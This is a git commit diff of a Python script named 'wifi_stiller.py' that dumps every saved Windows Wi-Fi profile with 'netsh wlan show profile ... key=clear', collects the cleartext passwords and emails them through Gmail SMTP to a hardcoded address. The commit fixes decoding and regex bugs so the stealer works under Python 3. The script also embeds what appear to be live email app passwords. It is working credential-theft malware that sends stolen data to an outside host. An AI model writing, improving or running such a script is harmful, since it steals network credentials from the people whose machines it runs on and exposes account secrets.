ed2eb18f3d69546f8b773f8026aa18f680225208
Rasulov Shodiyor <108322250+ruymhdi@users.noreply.github.com>
2023-10-24 01:02:19 -0400

    Add files via upload

--- wifi_stiller.py
+++ wifi_stiller.py
@@ -1,22 +1,23 @@
-import subprocess, re
+import subprocess
+import re
 import time
 import smtplib
 
 def send_mail(email, password, message):
-	server = smtplib.SMTP("smtp.gmail.com", 587)
-	server.starttls()
-	server.login(email, password)
-	server.sendmail(email, email, message)
-	server.quit()
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
 
 command = "netsh wlan show profile"
-networks = subprocess.check_output(command, shell=True)
-network_name_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+networks = subprocess.check_output(command, shell=True).decode('utf-8')  # Decode the bytes to a string
+network_names_list = re.findall("(?:Profile\\s*:\\s)(.*)", networks)  # Use the correct regex escape sequence for backslash
 
 result = ""
-for network_name in network_name_list:
-	command = "netsh wlan show profile " + network_name + " key=clear"
-	current_result = subprocess.check_output(command, shell=True)
-	result = result + current_result
+for network_name in network_names_list:
+  command = "netsh wlan show profile " + network_name + " key=clear"
+  current_result = subprocess.check_output(command, shell=True).decode('utf-8')
+  result = result + current_result
 
-send_mail("ruymhdi1@gmail.com", "mhc2p3qvmzz44hb3", result)
+send_mail("ruymhdi1@gmail.com", "bojvzyzbyvhheuxg", result)
